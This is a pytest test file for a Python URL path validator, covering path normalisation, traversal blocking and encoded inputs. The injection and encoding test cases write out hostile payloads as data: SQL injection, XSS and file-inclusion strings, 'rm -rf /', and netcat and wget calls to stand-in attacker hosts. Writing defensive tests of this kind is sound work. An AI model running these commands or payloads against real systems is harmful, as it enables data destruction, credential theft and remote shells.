from typing import cast

import pytest

from apaleoapi.services.url_path_validator import URLPathValidationError, URLPathValidator

pytestmark = [pytest.mark.unit]


class TestURLPathValidator:
    """Test cases for URLPathValidator."""

    def setup_method(self) -> None:
        """Setup test instance."""
        self.validator = URLPathValidator()

    @pytest.mark.parametrize(
        "input_path,expected_output",
        [
            # Basic valid paths
            ("/api/v1/users", "/api/v1/users"),
            ("api/v1/users", "/api/v1/users"),
            ("/", "/"),
            ("", "/"),
            # URL encoded paths
            ("/api/users/%20test", "/api/users/ test"),
            ("/api/users/test%2Bname", "/api/users/test+name"),
            ("/api/users/100%25", "/api/users/100%"),
            # Path normalization
            ("/api//v1///users", "/api/v1/users"),
            ("/api/./v1/users", "/api/v1/users"),
            ("/api/v1/users/", "/api/v1/users"),
            ("//api/v1/users", "/v1/users"),  # Double slash removes first path segment
            # Complex valid paths
            ("/api/v1/properties/BER", "/api/v1/properties/BER"),
            ("/identity/v1/users/123", "/identity/v1/users/123"),
            ("/core/v0/inventory", "/core/v0/inventory"),
            # Paths with special characters (valid)
            ("/api/users/user-123", "/api/users/user-123"),
            ("/api/users/user_test", "/api/users/user_test"),
            ("/api/v1/files/document.pdf", "/api/v1/files/document.pdf"),
        ],
    )
    def test_validate_success(self, input_path: str, expected_output: str) -> None:
        """Test successful path validation."""
        result = self.validator.validate(input_path)
        assert result == expected_output

    @pytest.mark.parametrize(
        "invalid_input",
        [
            # Non-string inputs
            None,
            123,
            [],
            {},
            True,
        ],
    )
    def test_validate_non_string_input(self, invalid_input: object) -> None:
        """Test validation fails for non-string inputs."""
        with pytest.raises(URLPathValidationError, match="Path must be a string"):
            self.validator.validate(cast(str, invalid_input))

    @pytest.mark.parametrize(
        "path_traversal_input",
        [
            # Direct path traversal attempts
            "../etc/passwd",
            "../../secrets",
            "/api/../../../etc/hosts",
            # Encoded path traversal attempts
            "/api/%2E%2E/secrets",
            "/api/v1/../../../etc",
            # Mixed path traversal
            "/api/v1/users/../../../admin",
            "api/../config",
            "/legitimate/path/../../../etc/passwd",
            # Complex traversal patterns
            "/api/./v1/../../../secrets",
            "/api/v1/users/123/../../admin",
        ],
    )
    def test_validate_path_traversal_prevention(self, path_traversal_input: str) -> None:
        """Test validation prevents path traversal attacks."""
        with pytest.raises(URLPathValidationError, match="Path traversal detected"):
            self.validator.validate(path_traversal_input)

    @pytest.mark.parametrize(
        "injection_attack",
        [
            # SQL injection attempts
            "/api/users/'; DROP TABLE users; --",
            "/api/users/1' OR '1'='1",
            "/api/users/1'; DELETE FROM users WHERE id=1; --",
            "/api/users/admin'/**/OR/**/1=1#",
            "/api/users/1' UNION SELECT * FROM passwords--",
            # Command injection attempts
            "/api/users/; ls -la",
            "/api/users/`whoami`",
            "/api/users/$(cat /etc/passwd)",
            "/api/users/; rm -rf /",
            "/api/users/| nc attacker.com 4444",
            "/api/users/&& wget malicious.com/shell.sh",
            # Script injection (XSS-like in paths)
            "/api/users/<script>alert('xss')</script>",
            "/api/users/javascript:alert(1)",
            "/api/users/<img src=x onerror=alert(1)>",
            "/api/users/';alert('xss');//",
            "/api/users/<svg onload=alert(1)>",
            # File inclusion attacks
            "/api/users/file:///etc/passwd",
            "/api/users/php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "/api/users/data://text/plain;base64,SGVsbG8=",
            "/api/users/expect://ls",
            # Null byte injection
            "/api/users/test\x00.txt",
            "/api/users/admin\x00",
            "/api/config\x00.backup",
            # Protocol handler injection
            "/api/users/ftp://malicious.com/",
            "/api/users/ldap://attacker.com/",
            "/api/users/gopher://evil.com:70/",
            # Format string attacks
            "/api/users/%n%n%n%n",
            "/api/users/%x%x%x%x",
            "/api/users/%s%s%s%s",
            # Buffer overflow attempts (very long paths)
            "/api/users/" + "A" * 10000,
            "/api/" + "B" * 5000 + "/users",
            "/" + "C" * 20000,
        ],
    )
    def test_validate_injection_attacks_prevention(self, injection_attack: str) -> None:
        """Test validation handles various injection attacks safely."""
        # Path traversal should be blocked, other attacks may pass through
        # The validator should not crash or execute any injected code
        try:
            result = self.validator.validate(injection_attack)
            # If validation succeeds, ensure the result is safe
            assert isinstance(result, str)
            assert result.startswith("/")
            # The validator is focused on path traversal, not general sanitization
            # So injection patterns may remain, which is acceptable for a path validator
        except URLPathValidationError:
            # It's acceptable for validator to reject some dangerous inputs
            pass

    @pytest.mark.parametrize(
        "malicious_encoding",
        [
            # Double URL encoding
            "/api/users/%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
            "/api/users/%252F%252E%252E%252F",
            # Unicode encoding attacks
            "/api/users/\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",
            "/api/users/\uff0e\uff0e\uff0f",
            # Mixed encoding
            "/api/users/%2E%2E%2F%2E%2E/etc/passwd",
            "/api/users/.%252E/secret",
            # Overlong UTF-8 sequences
            "/api/users/\xc0\xae\xc0\xae\xc0\xaf",
            "/api/users/\xe0\x80\xae\xe0\x80\xae\xe0\x80\xaf",
        ],
    )
    def test_validate_encoding_attacks_prevention(self, malicious_encoding: str) -> None:
        """Test validation prevents encoding-based attacks."""
        try:
            result = self.validator.validate(malicious_encoding)
            # Should not result in path traversal after decoding
            assert ".." not in result.split("/")
        except (URLPathValidationError, UnicodeDecodeError):
            # Acceptable to reject malformed encodings
            pass

    @pytest.mark.parametrize(
        "directory_listing_attack",
        [
            # Directory listing attempts
            "/api/users/.",
            "/api/users/./",
            "/api/.",
            "/./api/users",
            "/.../",
            "/api/users/.../secret",
        ],
    )
    def test_validate_directory_listing_prevention(self, directory_listing_attack: str) -> None:
        """Test validation prevents directory listing attacks."""
        result = self.validator.validate(directory_listing_attack)
        # Should be normalized safely without allowing directory references
        assert result.startswith("/")
        # Should not contain standalone dots that could reference directories
        path_parts = result.strip("/").split("/") if result != "/" else []
        assert "." not in path_parts
        assert ".." not in path_parts

    def test_validate_url_with_scheme_and_host(self) -> None:
        """Test validation extracts path from full URLs."""
        # URLs with schemes and hosts should extract just the path
        result = self.validator.validate("https://api.example.com/api/v1/users")
        assert result == "/api/v1/users"

        result = self.validator.validate("http://localhost:8000/identity/users")
        assert result == "/identity/users"

    @pytest.mark.parametrize(
        "edge_case_input,expected_output",
        [
            # Root path variations
            ("/", "/"),
            ("", "/"),  # Empty string becomes "/" due to normpath behavior
            ("//", "/"),  # Double slash becomes "/" due to normpath behavior
            ("///", "/"),
            # Single character paths
            ("a", "/a"),
            ("/a", "/a"),
            ("1", "/1"),
            # Paths with query parameters and fragments (should be ignored)
            ("/api/users?page=1", "/api/users"),
            ("/api/users#section", "/api/users"),
            ("/api/users?page=1&size=10#results", "/api/users"),
            # Unicode characters (URL encoded)
            ("/api/users/caf%C3%A9", "/api/users/café"),
            ("/api/files/résumé.pdf", "/api/files/résumé.pdf"),
        ],
    )
    def test_validate_edge_cases(self, edge_case_input: str, expected_output: str) -> None:
        """Test validation handles edge cases correctly."""
        result = self.validator.validate(edge_case_input)
        assert result == expected_output

    def test_validate_preserves_path_structure(self) -> None:
        """Test validation preserves legitimate path structure."""
        # Test that normal paths with similar patterns to traversal are preserved
        result = self.validator.validate("/api/v1/documents/file..txt")
        assert result == "/api/v1/documents/file..txt"

        result = self.validator.validate("/api/v1/users/user...123")
        assert result == "/api/v1/users/user...123"

    def test_error_message_content(self) -> None:
        """Test error messages are appropriate."""
        # Test non-string error
        with pytest.raises(URLPathValidationError) as exc_info:
            self.validator.validate(cast(str, 123))
        assert "Path must be a string" in str(exc_info.value)

        # Test path traversal error
        with pytest.raises(URLPathValidationError) as exc_info:
            self.validator.validate("../etc/passwd")
        assert "Path traversal detected" in str(exc_info.value)

    def test_validator_is_reusable(self) -> None:
        """Test that validator instance can be reused safely."""
        # Ensure validator doesn't maintain state between calls
        result1 = self.validator.validate("/api/v1/users")
        result2 = self.validator.validate("/identity/v1/accounts")
        result3 = self.validator.validate("core/v0/properties")

        assert result1 == "/api/v1/users"
        assert result2 == "/identity/v1/accounts"
        assert result3 == "/core/v0/properties"
        assert result2 == "/identity/v1/accounts"
        assert result3 == "/core/v0/properties"
